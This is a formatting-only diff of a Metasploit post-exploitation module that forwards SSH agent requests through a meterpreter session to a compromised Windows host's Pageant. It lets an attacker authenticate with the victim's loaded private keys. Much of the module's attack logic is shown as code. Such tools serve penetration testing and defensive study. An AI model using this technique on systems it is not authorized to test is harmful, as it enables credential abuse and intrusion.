@@ -9,31 +9,35 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
 
   def initialize(info = {})
-    super(update_info(info,
-                      'Name'          => 'Forward SSH Agent Requests To Remote Pageant',
-                      'Description'   => %q{
-                         This module forwards SSH agent requests from a local socket to a remote Pageant instance.
-                         If a target Windows machine is compromised and is running Pageant, this will allow the
-                         attacker to run normal OpenSSH commands (e.g. ssh-add -l) against the Pageant host which are
-                         tunneled through the meterpreter session. This could therefore be used to authenticate
-                         with a remote host using a private key which is loaded into a remote user's Pageant instance,
-                         without ever having knowledge of the private key itself.
+    super(
+      update_info(
+        info,
+        'Name' => 'Forward SSH Agent Requests To Remote Pageant',
+        'Description' => %q{
+          This module forwards SSH agent requests from a local socket to a remote Pageant instance.
+          If a target Windows machine is compromised and is running Pageant, this will allow the
+          attacker to run normal OpenSSH commands (e.g. ssh-add -l) against the Pageant host which are
+          tunneled through the meterpreter session. This could therefore be used to authenticate
+          with a remote host using a private key which is loaded into a remote user's Pageant instance,
+          without ever having knowledge of the private key itself.
 
-                         Note that this requires the PageantJacker meterpreter extension, but this will be automatically
-                         loaded into the remote meterpreter session by this module if it is not already loaded.
-                       },
-                      'License'       => MSF_LICENSE,
-                      'Author'        => [
-                        'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>',
-                        'Ben Campbell', # A HUGE amount of support in this :-)
-                      ],
-                      'Platform'      => [ 'win' ],
-                      'SessionTypes'  => [ 'meterpreter' ]
-                     ))
+          Note that this requires the PageantJacker meterpreter extension, but this will be automatically
+          loaded into the remote meterpreter session by this module if it is not already loaded.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>',
+          'Ben Campbell', # A HUGE amount of support in this :-)
+        ],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
     register_options(
       [
         OptString.new('SocketPath', [false, 'Specify a filename for the local UNIX socket.', nil])
-      ])
+      ]
+    )
   end
 
   def setup
@@ -47,7 +51,6 @@ class MetasploitModule < Msf::Post
       end
     end
   end
-
 
   def run
     # Check to ensure that UNIX sockets are supported
@@ -82,13 +85,14 @@ class MetasploitModule < Msf::Post
         loop do
           socket_request_data = s.recvfrom(8192) # 8192 = AGENT_MAX
           break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
+
           vprint_status("PageantJacker: Received data from socket (size: #{socket_request_data.first.size})")
           response = session.extapi.pageant.forward(socket_request_data.first, socket_request_data.first.size)
           if response[:success]
             begin
               s.send response[:blob], 0
-          rescue
-            break
+            rescue
+              break
             end
             vprint_status("PageantJacker: Response received (Success='#{response[:success]}' Size='#{response[:blob].size}' Error='#{translate_error(response[:error])}')")
           else
